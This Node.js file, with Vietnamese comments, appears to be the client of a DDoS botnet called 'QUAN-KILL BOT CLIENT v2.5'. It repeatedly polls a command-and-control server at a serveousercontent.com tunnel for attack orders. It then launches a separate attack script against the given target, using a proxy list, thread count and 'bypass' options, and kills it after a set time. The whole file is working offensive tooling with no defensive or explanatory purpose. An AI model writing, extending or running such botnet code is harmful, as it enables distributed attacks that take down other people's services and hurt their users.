// File: bot2.js
// Run: node bot2.js

const axios = require('axios');
const { spawn } = require('child_process');
const fs = require('fs');

// ==================== CONFIG ====================
const CNC_BASE_URL = "https://quan-kill.serveousercontent.com";
const ATTACK_SCRIPT = "l.js";

let currentTunnel = CNC_BASE_URL;
let isAttacking = false;

// ==================== TÌM PROXY ====================
function findProxyFile() {
    try {
        const files = fs.readdirSync(__dirname);
        for (const file of files) {
            if (file.endsWith('.txt')) {
                console.log(`[+] Found proxy file: ${file}`);
                return file;
            }
        }
        console.error("[-] No proxy file found!");
        return null;
    } catch (err) {
        console.error(`[-] Error reading directory: ${err.message}`);
        return null;
    }
}

// ==================== THỰC THI ATTACK ====================
async function executeAttack(commandData) {
    return new Promise((resolve) => {
        const { method, target, time, threads, bypass_options } = commandData;
        const proxyFile = findProxyFile();
        
        if (!proxyFile) {
            console.log("[-] Abort attack due to missing proxy file.");
            resolve(false);
            return;
        }

        let args = [ATTACK_SCRIPT, method, target, time.toString(), threads.toString(), "90", proxyFile];
        
        if (bypass_options && bypass_options !== "") {
            const opts = bypass_options.split(' ');
            args = args.concat(opts);
        }
        
        console.log(`[+] Executing: node ${args.join(' ')}`);

        const child = spawn('node', args, { detached: false });

        child.stdout.on('data', (data) => {
            console.log(`[STDOUT] ${data.toString().trim()}`);
        });

        child.stderr.on('data', (data) => {
            console.error(`[STDERR] ${data.toString().trim()}`);
        });

        child.on('close', (code) => {
            console.log(`[+] Attack process finished (code ${code}).`);
            resolve(true);
        });

        child.on('error', (err) => {
            console.error(`[!] Failed to start: ${err.message}`);
            resolve(false);
        });

        setTimeout(() => {
            if (!child.killed) {
                child.kill('SIGKILL');
                console.log(`[!] Attack process killed due to timeout.`);
            }
            resolve(true);
        }, time * 1000 + 5000);
    });
}

// ==================== HÀM DELAY ====================
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ==================== LẤY LỆNH TỪ CNC ====================
async function checkCommand() {
    // Random delay 0-3 giây (tránh tất cả bot gọi API cùng 1 lúc)
    await sleep(Math.floor(Math.random() * 3000));

    if (isAttacking) {
        console.log("[*] Still attacking, skipping check...");
        return;
    }

    try {
        const commandUrl = `${currentTunnel}/api/command`;
        const response = await axios.get(commandUrl, { timeout: 5000 });
        const data = response.data;

        if (data.active) {
            console.log(`\n[!] RECEIVED ATTACK COMMAND!`);
            console.log(`    Method : ${data.method}`);
            console.log(`    Target : ${data.target}`);
            console.log(`    Time   : ${data.time}s`);
            console.log(`    Threads: ${data.threads}`);
            console.log('');

            isAttacking = true;
            await executeAttack(data);
            
            await sleep(3000);
            isAttacking = false;
            console.log(`[*] Waiting for next command...`);
        }
    } catch (error) {
        if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT') {
            console.log(`[-] Cannot connect to CNC. Retry in 15s...`);
        } else {
            console.log(`[-] Error: ${error.message}. Retry in 15s...`);
        }
    }
}

// ==================== MAIN LOOP ====================
async function mainLoop() {
    console.clear();
    console.log("╔══════════════════════════════════════╗");
    console.log("║     QUAN-KILL BOT CLIENT v2.5       ║");
    console.log("╚══════════════════════════════════════╝");
    console.log(`[*] CNC Base URL: ${CNC_BASE_URL}`);
    console.log(`[*] Attack Script: ${ATTACK_SCRIPT}`);
    console.log(`[*] Random API delay: 0-3s`);
    console.log(`[*] Idle check interval: 3s`);
    console.log('');

    while (true) {
        await checkCommand();
        // Nếu đang attack thì check lại sau 5s, không thì 3s
        await sleep(isAttacking ? 5000 : 3000);
    }
}

// ==================== KHỞI ĐỘNG ====================
mainLoop();